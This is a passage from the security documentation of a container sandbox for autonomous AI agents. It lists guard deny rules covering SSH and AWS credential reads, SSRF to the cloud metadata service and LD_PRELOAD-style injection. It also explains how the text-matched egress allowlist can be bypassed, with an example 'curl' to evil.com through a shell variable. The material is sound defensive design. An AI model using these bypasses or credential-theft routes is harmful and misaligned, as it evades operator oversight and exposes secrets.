...
- Always: `git`, reads of foreign secret stores (`~/.ssh`, `.aws/credentials`, other agents' secrets), **SSRF to the cloud instance-metadata service** (`169.254.169.254` / `metadata.google.internal` — a credential-theft vector; applies to both `Bash` and `WebFetch`), and **dynamic-loader / interpreter env injection** (`LD_PRELOAD`, `DYLD_*`, `NODE_OPTIONS`, `BASH_ENV`, `GIT_SSH_COMMAND`, `PERL5LIB`, `PYTHONSTARTUP`) — these smuggle code into the next process and would otherwise bypass the guard.
  - Not a guard rule, but structural: spending the operator's money / publishing has **no denylist** (removed 2026-06-27) — it is prevented by *never mounting a payment or legal-identity credential into a pod*. A capability the agent doesn't hold can't be string-matched around.
...
> ⚠ **Egress: the text allowlist is advisory; the kernel sidecar is the real control.** The text-matched allowlist **logs** a disallowed host and permits the call until you set `GUARD_EGRESS_ENFORCE=1`, and it is bypassable by indirection (`U=$host; curl $U`, user@host URLs, direct-IP connects) even when enforcing. Treat it as an audit trail, not a wall.
>
> **The wall is `docker-compose.egress.yml`** — a kernel-level default-deny (DNS proxy + nftables) that command-string tricks cannot walk around. As of 2026-08-22 `enclave new` **scaffolds it by default** (policy file + `EGRESS_TOKEN`); `--unsafe-network` opts out for throwaway pods. It was previously a 4-step manual ritual, which meant in practice it was off everywhere — the activation cost was the vulnerability.
>
> `PERMISSION=dangerous` is required for unattended autonomy and is only safe inside these boundaries. preflight's `containment` check warns whenever `dangerous` runs with advisory egress or an unscoped `SECRETS_DIR`. The kernel/container boundary (caps, mounts, no-new-privileges) is always enforced.
>
> ⚠ **Even in enforce mode, the egress allowlist is best-effort, not a network wall.** It works by extracting a hostname from the literal command/URL text, so it is defeated by indirection (`U=https://evil.com; curl $U`), by `user@host` URL tricks, and by any client whose target the regex can't see. Host patterns are matched with shell-style wildcards whose `*` spans dots — keep them **specific** (an entry like `*.amazonaws.com` matches an attacker-nameable `evil-bucket.s3.amazonaws.com`; the default policy ships without it for exactly this reason). A true deny-by-default network boundary needs a proxy/DNS layer at the container edge, not command-text matching — that layer now ships as an opt-in overlay: **`docker-compose.egress.yml` + docs/EGRESS.md** (a sidecar owning the agent's netns, DNS proxy + nftables default-deny in the kernel; all of the above bypasses fail against it).
